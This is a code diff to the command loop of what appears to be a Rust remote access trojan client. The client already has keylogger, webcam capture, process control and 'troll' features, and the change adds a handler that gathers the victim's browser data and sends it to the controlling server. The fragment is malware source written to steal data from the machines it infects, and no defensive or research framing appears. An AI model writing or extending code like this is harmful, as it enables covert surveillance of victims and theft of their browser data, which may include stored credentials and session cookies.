@@ -5,6 +5,7 @@ use crate::features::process::{process_list, kill_process, start_process, suspen
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
 use crate::features::keylogger::{start_keylogger, stop_keylogger, send_offline_logs, clear_offline_logs};
+use crate::features::browser::get_browser_data;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
@@ -134,6 +135,11 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::GetOfflineLogs)) => send_offline_logs().await,
 
             Ok(Some(ClientboundPacket::ClearOfflineLogs)) => clear_offline_logs(),
+
+            Ok(Some(ClientboundPacket::GetBrowserData)) => {
+                let data = get_browser_data();
+                let _ = send_packet(ServerboundPacket::BrowserData(data)).await;
+            }
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
